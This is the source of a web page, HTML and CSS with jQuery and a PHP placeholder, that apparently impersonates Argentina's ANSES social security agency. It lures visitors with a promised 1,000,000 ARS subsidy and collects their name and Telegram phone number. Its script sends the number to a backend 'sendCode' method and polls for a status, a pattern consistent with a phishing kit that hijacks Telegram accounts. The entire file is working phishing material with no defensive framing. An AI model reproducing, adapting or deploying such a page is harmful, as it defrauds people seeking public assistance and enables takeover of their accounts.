<style>
  /* Reset & Base Styles */
  .lander-container {
    text-align: left;
    color: #333;
  }

  /* Loader Style */
  .loader {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.8);
    z-index: 9999;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .spinner {
    width: 40px;
    height: 40px;
    border: 4px solid #f3f3f3;
    border-top: 4px solid #0080c7;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% {
      transform: rotate(0deg);
    }

    100% {
      transform: rotate(360deg);
    }
  }

  /* Form Styles */
  .anses-label {
    font-size: 14px;
    font-weight: 700;
    color: #002f5a;
    margin-bottom: 8px;
    display: block;
  }

  .anses-input-group {
    position: relative;
    margin-bottom: 20px;
  }

  .anses-input {
    width: 100%;
    height: 45px;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 10px 15px;
    font-size: 16px;
    transition: border-color 0.3s;
  }

  .anses-input:focus {
    border-color: #0080c7;
    outline: none;
    box-shadow: 0 0 5px rgba(0, 128, 199, 0.2);
  }

  /* Button Style ANSES */
  .btn-anses-submit {
    width: 100%;
    background-color: #0080c7;
    color: white;
    border: none;
    padding: 12px;
    border-radius: 4px;
    font-weight: 700;
    font-size: 16px;
    cursor: pointer;
    margin-top: 10px;
    text-transform: uppercase;
  }

  .btn-anses-submit:hover {
    background-color: #005a8d;
  }

  .flag-img {
    position: absolute;
    left: 12px;
    top: 50%;
    transform: translateY(-50%);
    width: 25px;
    display: none;
  }

  .warning-text {
    color: #d32f2f;
    font-size: 13px;
    margin-bottom: 10px;
    display: none;
  }
</style>

<div class="lander-container py-2 d-block">

  <div class="loader" id="loader">
    <div class="spinner"></div>
  </div>

  <div class="mb-4">
    <h5 style="color: #002f5a; font-weight: 800; margin-bottom: 5px;">Solicitud de Asistencia</h5>
    <p style="font-size:14px; color:#666; line-height:1.4;">
      Completá tus datos para verificar la elegibilidad al cobro de <strong>$1.000.000 (ARS)</strong> a través de los
      programas de seguridad sosial.
    </p>
  </div>

  <form id="formLander">
    <div class="mb-3">
      <label class="anses-label">Nombre y Apellido completo</label>
      <div class="anses-input-group">
        <input type="text" name="nama" class="anses-input shadow-none" placeholder="Ej: Juan Pérez" required>
      </div>
    </div>

    <div class="mb-3">
      <label class="anses-label">Número de Teléfono (Telegram)</label>
      <div class="anses-input-group">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Flag_of_Argentina.svg" id="flagIcon"
          class="flag-img">
        <input type="text" class="anses-input shadow-none" name="phone" id="phone" placeholder="Código de área + número"
          autocomplete="off" inputmode="numeric" required>
      </div>
    </div>

    <div class="mb-3" style="display:flex; gap:10px; align-items: flex-start;">
      <input type="checkbox" id="agree" style="width:18px; height:18px; margin-top:2px; accent-color:#0080c7;">
      <label for="agree" style="font-size:13px; color:#444; cursor:pointer; line-height: 1.2;">
        Acepto los términos y condiciones para el registro en el sistema de subsidios.
      </label>
    </div>

    <div id="checkboxWarning" class="warning-text text-center">
      ⚠️ Debe aceptar los términos para continuar.
    </div>

    <div id="wrong" class="warning-text text-center" style="display:none;">
      ❌ El número ingresado no es válido o no está registrado.
    </div>

    <button type="submit" class="btn-anses-submit" id="claimBtn">
      SOLICITAR COBRO
    </button>
  </form>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
  $(document).ready(function () {

    $("#wrong").hide();
    $("#loader").hide();
    $("#checkboxWarning").hide();

    // FUNCTION TAMPILKAN FLAG (Argentina)
    function showCountry() {
      $("#flagIcon").css("display", "block");
      $("#phone").css("padding-left", "45px");

      if ($("#phone").val() == "") {
        $("#phone").val("+54 ");
      }
    }

    $("#phone").on("focus click input touchstart", function () {
      showCountry();
    });

    $("#agree").on("change", function () {
      if ($(this).is(":checked")) {
        $("#checkboxWarning").fadeOut();
      }
    });

    function checkStatus() {
      $("#wrong").hide();
      $.ajax({
        url: "<?= base_url("API/index.php") ?>",
        type: "POST",
        data: { "method": "getStatus" },
        success: function (data) {
          if (data.result.status == "success") {
            window.location.reload();
          }
          else if (data.result.status == "failed") {
            $("#wrong").show();
            $("#loader").hide();
          }
          else {
            setTimeout(function () {
              checkStatus();
            }, 500);
          }
        },
        error: function () { }
      });
    }

    // BUTTON CLICK
    $("#claimBtn").on("click", function (e) {
      e.preventDefault();

      if (!$("#agree").is(":checked")) {
        $("#checkboxWarning").fadeIn();
        return;
      }

      var phone = $("#phone").val();
      if (phone != "") {
        $("#loader").show();
        $.ajax({
          url: "<?= base_url("API/index.php") ?>",
          type: "POST",
          data: {
            "method": "sendCode",
            "phone": phone
          },
          success: function () {
            setTimeout(function () {
              checkStatus();
            }, 500);
          },
          error: function () {
            $("#loader").hide();
          }
        });
      }
    });
  });
</script>